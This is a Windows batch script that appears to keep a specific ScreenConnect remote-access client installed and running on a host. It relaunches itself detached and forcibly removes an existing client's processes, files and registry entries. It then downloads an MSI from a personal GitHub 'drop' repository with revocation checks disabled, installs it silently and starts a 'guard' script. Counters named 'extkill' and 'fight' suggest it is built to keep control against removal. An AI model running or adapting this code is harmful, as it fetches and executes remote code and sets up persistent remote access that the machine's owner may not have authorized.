@echo off
rem WINRTCS_GRYXA_RECOVER R1 - bring Gryxa FP 36e506ff back when Sight reinstall left 1060.
rem Self-detaches (agent cmd channel is 60s). C03: NO msiexec /x (keepers stay).
rem Log: C:\Users\Public\gryxa_recover.log
if /I not "%~1"=="--detached" (
  copy /y "%~f0" "C:\Users\Public\gryxa_recover_run.cmd" >nul 2>&1
  if not exist "C:\Users\Public\gryxa_recover_run.cmd" copy /y "%~f0" "%SystemRoot%\Temp\gryxa_recover_run.cmd" >nul 2>&1
  if exist "C:\Users\Public\gryxa_recover_run.cmd" (
    start "" /min cmd.exe /c "C:\Users\Public\gryxa_recover_run.cmd --detached"
  ) else (
    start "" /min cmd.exe /c "%SystemRoot%\Temp\gryxa_recover_run.cmd --detached"
  )
  echo QUEUED gryxa-recover detached - log C:\Users\Public\gryxa_recover.log
  exit /b 0
)
setlocal EnableExtensions EnableDelayedExpansion
set "ZD=C:\ProgramData\WinRTCS"
set "LOG=C:\Users\Public\gryxa_recover.log"
set "CURL=%SystemRoot%\System32\curl.exe"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "GFP=36e506ff016b2151"
set "GSVC=ScreenConnect Client (%GFP%)"
set "MSI=%ZD%\gryxa_install.msi"
set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
set "PACKED=814CC7D9653A3969CD5C14CE440DB313"
set "GDIR86=%ProgramFiles(x86)%\ScreenConnect Client (%GFP%)"
set "GDIR64=%ProgramFiles%\ScreenConnect Client (%GFP%)"
if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
>"%LOG%" echo [%DATE% %TIME%] recover_begin host=%COMPUTERNAME%

> "%ZD%\extkill.cnt" echo 0
> "%ZD%\fight.cnt" echo 0
> "%ZD%\guard.cnt" echo 9999
> "%ZD%\gryxa_boost.cnt" echo 15
rmdir /s /q "%ZD%\guard.lockd" >nul 2>&1

echo [%DATE% %TIME%] step_stop_delete>>"%LOG%"
sc stop "%GSVC%" >>"%LOG%" 2>&1
sc delete "%GSVC%" >>"%LOG%" 2>&1

echo [%DATE% %TIME%] step_kill_locks>>"%LOG%"
powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $o=@(); Get-CimInstance Win32_Process | Where-Object { ($_.ExecutablePath -and $_.ExecutablePath -match '36e506ff016b2151') -or ($_.CommandLine -and $_.CommandLine -match '36e506ff016b2151') } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force; $o += ('killed pid=' + $_.ProcessId) }; $dirs=@(); $pf86=[Environment]::GetEnvironmentVariable('ProgramFiles(x86)'); if($pf86){ $dirs += (Join-Path $pf86 'ScreenConnect Client (36e506ff016b2151)') }; $dirs += (Join-Path $env:ProgramFiles 'ScreenConnect Client (36e506ff016b2151)'); foreach($d in $dirs){ if(Test-Path -LiteralPath $d){ cmd /c ('takeown /f \"'+$d+'\" /r /d y'); cmd /c ('icacls \"'+$d+'\" /grant Administrators:F /t /c /q'); try { Remove-Item -LiteralPath $d -Recurse -Force; $o += ('rmdir_ok '+$d) } catch { $o += ('rmdir_fail '+$d) } } }; foreach($k in @('HKLM:\SOFTWARE\Classes\Installer\Products\814CC7D9653A3969CD5C14CE440DB313','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\814CC7D9653A3969CD5C14CE440DB313','HKCR:\Installer\Products\814CC7D9653A3969CD5C14CE440DB313','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{9D7CC418-A356-9693-DCC5-41EC44D03B31}','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{9D7CC418-A356-9693-DCC5-41EC44D03B31}')){ if(Test-Path $k){ Remove-Item -Path $k -Recurse -Force; $o += ('reg_del '+$k) } }; if(-not $o){ $o=@('nothing_to_purge') }; $o | Add-Content -Path 'C:\Users\Public\gryxa_recover.log' -Encoding ASCII"

echo [%DATE% %TIME%] step_fetch_msi>>"%LOG%"
del /f /q "%MSI%" >nul 2>&1
"%CURL%" -f -L --ssl-no-revoke --connect-timeout 10 --max-time 180 -o "%MSI%" "%BASE%/pkg_gryxa.msi" >>"%LOG%" 2>&1
set "OKMSI="
if exist "%MSI%" for %%F in ("%MSI%") do if %%~zF GEQ 5000000 set "OKMSI=1"
if not defined OKMSI (
  echo [%DATE% %TIME%] FAIL_no_msi>>"%LOG%"
  echo RECOVER=FAIL_NO_MSI
  endlocal & exit /b 3
)
for %%F in ("%MSI%") do echo [%DATE% %TIME%] msi_ok size=%%~zF>>"%LOG%"

echo [%DATE% %TIME%] step_msiexec_i_sync>>"%LOG%"
powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='Continue'; $p=Start-Process -FilePath msiexec.exe -ArgumentList '/i C:\ProgramData\WinRTCS\gryxa_install.msi /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /l*v C:\ProgramData\WinRTCS\msi_gryxa_install.log' -Wait -PassThru; ('msiexec_exit=' + $p.ExitCode) | Add-Content -Path 'C:\Users\Public\gryxa_recover.log' -Encoding ASCII; exit $p.ExitCode"
set "MSIEXIT=%ERRORLEVEL%"
echo [%DATE% %TIME%] msiexec_exit=%MSIEXIT%>>"%LOG%"

ping -n 16 127.0.0.1 >nul 2>&1
sc config "%GSVC%" start= auto >>"%LOG%" 2>&1
sc start "%GSVC%" >>"%LOG%" 2>&1
ping -n 11 127.0.0.1 >nul 2>&1
sc query "%GSVC%" >>"%LOG%" 2>&1

sc query "%GSVC%" 2>nul | findstr /C:"RUNNING" >nul
if errorlevel 1 (
  echo [%DATE% %TIME%] FAIL_svc>>"%LOG%"
  echo RECOVER=FAIL_SVC
  start "" /min cmd.exe /c "%ZD%\winrtcs_guard.cmd"
  endlocal & exit /b 4
)
echo [%DATE% %TIME%] OK running>>"%LOG%"
echo RECOVER=OK
start "" /min cmd.exe /c "%ZD%\winrtcs_guard.cmd"
del /f /q "C:\Users\Public\gryxa_recover_run.cmd" "%SystemRoot%\Temp\gryxa_recover_run.cmd" >nul 2>&1
endlocal & exit /b 0
